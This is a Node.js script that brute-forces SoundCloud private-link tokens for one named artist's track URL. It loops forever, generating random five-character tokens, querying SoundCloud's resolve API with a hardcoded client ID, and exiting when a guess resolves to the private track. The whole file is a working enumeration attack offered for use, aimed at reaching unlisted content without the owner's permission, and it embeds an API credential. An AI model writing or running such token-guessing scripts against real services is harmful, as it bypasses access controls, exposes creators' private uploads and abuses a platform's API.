const method = "GET" // POST, GET, OPTIONS, DELETE, PUT
const body = null
const rate_limit = 1 // higher is faster.
const token_length = 5

const song_url = "https://soundcloud.com/lildvrkie/g"








const crypto = require("node:crypto");
const util = require("node:util");

const random = util.promisify(crypto.randomInt);

async function gen(length) {
    var result = "";

    const validChars = 
          "0123456789"
        + "abcdefghijklmnopqrstuvwxyz"
        + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" 
        // + ",.-{}+!\"#$%/()=?";

    for (let i = 0; i < length; i++) {
        result += validChars[await random(0, validChars.length)];
    }

    return result;
}

async function request(id) {
    try {
        const res = await fetch(
            `https://api-v2.soundcloud.com/resolve?url=${song_url}/s-${id}&format=json&client_id=gsPNGqVqXY4QlaFqDv7WBWglYHdTPsh6`,
            {
                method: method,
                compress: true,
                body: body,
            }
        );

        if (!res.ok) {
            console.error(`${song_url}/s-${id}`, res.status, await res.text());
            return;
        }

        if (res.ok) {
            console.error(`${song_url}/s-${id}`, res.status, await res.text());
            process.exit()
        }
        
    } catch (err) {
        console.error("Caught", err);
        // re-attempt
        await request(id);
    }
}

async function main() {
    for (;;) {
        const queue = [];

        for (let i = 0; i < rate_limit; i++) {
            queue.push(request(await gen(token_length)));
        }

        // wait for the batch of 10 to finish before sending another batch
        await Promise.all(queue);
    }
}

main();
